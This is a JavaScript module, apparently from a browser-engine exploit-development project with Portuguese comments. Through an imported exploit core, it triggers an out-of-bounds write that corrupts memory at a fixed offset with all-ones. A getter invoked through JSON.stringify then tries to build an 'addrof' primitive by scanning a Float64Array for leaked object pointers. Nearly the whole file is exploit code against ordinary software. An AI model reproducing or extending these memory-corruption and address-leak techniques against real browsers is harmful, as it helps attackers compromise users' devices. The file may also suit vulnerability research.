// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForSpeculativeAddrOf";
let getter_called_flag = false;
let current_test_results = { success: false, message: "Teste não iniciado.", error: null, potential_leaks: [] };

const CORRUPTION_OFFSET = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

class CheckpointForSpeculativeAddrOf {
    constructor(id) {
        this.id_marker = `SpecAddrOfCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "SpeculativeAddrOf_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        current_test_results = { success: false, message: "Getter chamado, tentando addrof especulativo.", error: null, potential_leaks: [] };

        try {
            const target_obj = { name: "TargetObjectForAddrOf", value: Date.now() }; // Objeto com valor único
            logS3(`DENTRO DO GETTER: target_obj criado: ${JSON.stringify(target_obj)}`, "info", FNAME_GETTER);

            const array_size = 16; // Tamanho para os arrays de teste
            let holding_array = new Array(array_size);
            let numeric_view_array = new Float64Array(array_size * 2); // Dobro do tamanho para aumentar chance de sobreposição de elementos

            // Preencher numeric_view_array com um padrão
            const float_pattern = 1.123456789012345e+100; // Um double distinto
            for (let i = 0; i < numeric_view_array.length; i++) {
                numeric_view_array[i] = float_pattern;
            }

            // Colocar o objeto alvo no meio do holding_array
            const target_index_in_holder = Math.floor(array_size / 2);
            holding_array[target_index_in_holder] = target_obj;
            // Preencher o resto do holding_array para tentar estabilizar o layout
            for (let i = 0; i < array_size; i++) {
                if (i !== target_index_in_holder) {
                    holding_array[i] = { filler: i };
                }
            }
            logS3(`DENTRO DO GETTER: holding_array e numeric_view_array criados e preenchidos. target_obj em holding_array[${target_index_in_holder}]`, "info", FNAME_GETTER);


            // Forçar o motor a processar os arrays (pode ou não ajudar com o layout/GC)
            // @ts-ignore
            if (typeof gc === 'function') { /* gc(); */ } // Não chamar gc() a menos que saiba o impacto.
            // eslint-disable-next-line no-unused-vars
            let temp_str = JSON.stringify(holding_array[target_index_in_holder]); // Acessa o objeto


            // Tentar ler dos numeric_reader_arrays esperando encontrar um ponteiro para target_obj
            let found_potential_leak = false;
            for (let i = 0; i < numeric_view_array.length; i++) {
                const float_val = numeric_view_array[i];
                if (float_val !== float_pattern) { // Encontrou algo diferente do padrão!
                    const temp_buf = new ArrayBuffer(8);
                    const temp_dv = new DataView(temp_buf);
                    temp_dv.setFloat64(0, float_val, true); // Assume little-endian
                    const low = temp_dv.getUint32(0, true);
                    const high = temp_dv.getUint32(4, true);
                    const potential_ptr = new AdvancedInt64(low, high);
                    
                    const leak_info_str = `POTENCIAL LEAK: numeric_view_array[${i}] = ${float_val} (float) -> ${potential_ptr.toString(true)} (hex64)`;
                    logS3(leak_info_str, "leak", FNAME_GETTER);
                    current_test_results.potential_leaks.push({
                        index: i,
                        float_value: float_val,
                        hex_value: potential_ptr.toString(true)
                    });
                    found_potential_leak = true;
                }
            }

            if (found_potential_leak) {
                current_test_results.success = true;
                current_test_results.message = "Potencial(is) vazamento(s) de endereço encontrado(s) no numeric_view_array!";
            } else {
                current_test_results.message = "Nenhum vazamento de endereço óbvio encontrado nos numeric_view_array (todos os elementos mantiveram o padrão).";
            }

        } catch (e) {
            logS3(`DENTRO DO GETTER: ERRO durante tentativa de addrof: ${e.message}`, "error", FNAME_GETTER);
            current_test_results.error = String(e);
            current_test_results.message = `Erro no getter durante addrof: ${e.message}`;
        }
        return 0xBADF00D;
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForSpecAddrOf.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter para acionar lógica de teste...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_spec_addrof_test: true };
    }
}


export async function executeRetypeOOB_AB_Test() { // Nome da função exportada mantido
    const FNAME_TEST = "executeSpeculativeAddrOfInGetter"; // Nome interno
    logS3(`--- Iniciando Teste de AddrOf Especulativo no Getter (Array/Float64Array) ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado.", error: null, potential_leaks: [] };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { /* ... validação ... */ return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { /* ... erro ... */ return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Realizar a escrita OOB "gatilho"
        oob_write_absolute(CORRUPTION_OFFSET, CORRUPTION_VALUE, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET)} do oob_data completada.`, "info", FNAME_TEST);

        // 2. Criar o objeto CheckpointForSpeculativeAddrOf
        const checkpoint_obj_for_spec_addrof = new CheckpointForSpeculativeAddrOf(1);
        logS3(`CheckpointForSpeculativeAddrOf objeto criado. ID: ${checkpoint_obj_for_spec_addrof.id_marker}`, "info", FNAME_TEST);
        
        // 3. Chamar JSON.stringify
        logS3(`Chamando JSON.stringify(checkpoint_obj_for_spec_addrof)...`, "info", FNAME_TEST);
        let stringify_result = null;
        try {
            stringify_result = JSON.stringify(checkpoint_obj_for_spec_addrof);
            logS3(`JSON.stringify completado. Resultado: ${stringify_result}`, "info", FNAME_TEST);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
            if (!getter_called_flag) {
                 current_test_results.message = `Erro em JSON.stringify antes do getter: ${e.message}`;
                 current_test_results.error = String(e);
            }
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError), potential_leaks: [] };
    } finally {
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE ADDR_OF ESPECULATIVO: SUCESSO! ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE ADDR_OF ESPECULATIVO: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
        if (current_test_results.potential_leaks && current_test_results.potential_leaks.length > 0) {
            logS3("Potenciais Endereços Vazados Detalhados:", "leak", FNAME_TEST);
            current_test_results.potential_leaks.forEach(leak => {
                logS3(`  Índice [${leak.index}]: Float=${leak.float_value}, Hex64=${leak.hex_value}`, "leak", FNAME_TEST);
            });
        }
    } else {
        logS3("RESULTADO TESTE ADDR_OF ESPECULATIVO: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    // logS3(`  Detalhes finais JSON: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste de AddrOf Especulativo Concluído ---`, "test", FNAME_TEST);
}
